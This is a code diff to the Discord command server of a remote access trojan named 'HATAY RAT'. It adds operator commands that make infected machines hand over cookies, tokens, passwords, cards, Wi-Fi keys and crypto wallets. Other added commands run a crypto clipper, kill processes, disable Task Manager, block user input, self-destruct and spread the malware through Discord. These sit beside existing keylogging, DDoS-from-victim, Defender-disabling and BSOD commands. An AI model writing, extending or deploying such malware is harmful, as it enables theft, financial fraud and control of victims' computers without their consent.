@@ -98,12 +98,14 @@ def get_help_embed():
     embed = discord.Embed(title="🔴 HATAY RAT - Command Center", color=0xFF0000)
     embed.add_field(name="📊 INFO", value="`!info` `!screenshot` `!camshot` `!targets` `!use <id>`", inline=False)
     embed.add_field(name="📁 FILES", value="`!ls <path>` `!download <path>` `!upload <url> <name>` `!remove <path>`", inline=False)
-    embed.add_field(name="🎬 RECORDING", value="`!vidshot <sec>` `!audio <sec>`", inline=False)
     embed.add_field(name="⌨️ KEYLOGGER", value="`!keylog start` `!keylog stop` `!keylog dump`", inline=False)
-    embed.add_field(name="💀 GRAB", value="`!cookie` `!token` `!pass` `!card` `!crypto` `!dox` `!grab_plus` `!deep_token`", inline=False)
-    embed.add_field(name="⚡ ACTIONS", value="`!shell <cmd>` `!wall <url>` `!shutdown` `!defender_off` `!bsod` `!ddos <ip> <port> <sec>`", inline=False)
-    embed.add_field(name="🎭 PRANKS", value="`!stress <sec>` `!troll <message|open|beep|mouse|screamer> <val>`", inline=False)
-    embed.set_footer(text="HATAY RAT | Educational Use Only")
+    embed.add_field(name="💀 STEALER", value="`!cookie` `!token` `!pass` `!card` `!grab_plus` `!wifi` `!wallet_pro`", inline=False)
+    embed.add_field(name="� FINANCE", value="`!crypto` `!clipper <start|stop> <addr>`", inline=False)
+    embed.add_field(name="⚙️ SYSTEM", value="`!ps` `!kill <name>` `!taskmgr_off` `!block_input` `!unblock_input` `!shell <cmd>`", inline=False)
+    embed.add_field(name="⚡ ATTACK", value="`!ddos <ip> <port> <sec>` `!defender_off` `!bsod` `!spread <msg>`", inline=False)
+    embed.add_field(name="🎭 TROLL", value="`!tts <msg>` `!wall <url>` `!stress <sec>` `!troll <screamer|beep|mouse>`", inline=False)
+    embed.add_field(name="🧹 DANGER", value="`!cleanup` `!shutdown` `!dox`", inline=False)
+    embed.set_footer(text="HATAY RAT | Ultra Deep Features Enabled")
     return embed
 
 @bot.command()
@@ -166,7 +168,7 @@ async def token(ctx):
     if not current_target_id:
         return await ctx.send("❌ No target selected. Use `!use <id>` first.")
     queue_command(current_target_id, "token")
-    await ctx.send(f"💎 Discord tokens requested for `{current_target_id}`...")
+    await ctx.send(f"💎 Ultra Deep Token Search & Verification requested for `{current_target_id}`...")
 
 @bot.command()
 async def password(ctx, browser: str = "all"):
@@ -286,10 +288,70 @@ async def ddos(ctx, target: str, port: int = 80, duration: int = 60):
     await ctx.send(f"🔱 DDoS Attack initiated from victim to `{target}:{port}` for {duration}s!")
 
 @bot.command()
-async def deep_token(ctx):
+async def ps(ctx):
     if not current_target_id: return await ctx.send("❌ No target.")
-    queue_command(current_target_id, "deep_token")
-    await ctx.send(f"🔍 Deep Token Search (Slow but Global) requested for `{current_target_id}`...")
+    queue_command(current_target_id, "ps")
+    await ctx.send(f"📋 Requesting process list for `{current_target_id}`...")
+
+@bot.command()
+async def kill(ctx, name: str):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "kill", name)
+    await ctx.send(f"🔫 Killing process `{name}` on `{current_target_id}`...")
+
+@bot.command()
+async def tts(ctx, *, msg: str):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "tts", msg)
+    await ctx.send(f"🗣️ Speaking message `{msg}` on `{current_target_id}`...")
+
+@bot.command()
+async def taskmgr_off(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "taskmgr_off")
+    await ctx.send(f"🚫 Disabling Task Manager on `{current_target_id}`...")
+
+@bot.command()
+async def block_input(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "block_input")
+    await ctx.send(f"🔒 Blocking input on `{current_target_id}`...")
+
+@bot.command()
+async def unblock_input(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "unblock_input")
+    await ctx.send(f"🔓 Unblocking input on `{current_target_id}`...")
+
+@bot.command()
+async def cleanup(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "cleanup")
+    await ctx.send(f"🧹 Self-destruct sequence sent to `{current_target_id}`!")
+
+@bot.command()
+async def wifi(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "wifi")
+    await ctx.send(f"📶 Requesting Wi-Fi passwords for `{current_target_id}`...")
+
+@bot.command()
+async def clipper(ctx, action: str, addr: str = "0"):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "clipper", f"{action}|{addr}")
+    await ctx.send(f"✂️ Crypto Clipper `{action}` (Addr: {addr}) sent to `{current_target_id}`.")
+
+@bot.command()
+async def wallet_pro(ctx):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "wallet_pro")
+    await ctx.send(f"👛 Deep wallet search requested for `{current_target_id}`...")
+
+@bot.command()
+async def spread(ctx, *, msg: str):
+    if not current_target_id: return await ctx.send("❌ No target.")
+    queue_command(current_target_id, "spread", msg)
+    await ctx.send(f"🦠 Discord spread initiated from `{current_target_id}` with message: {msg}")
 
 def queue_command(client_id, type, payload=None):
     if client_id in sessions:
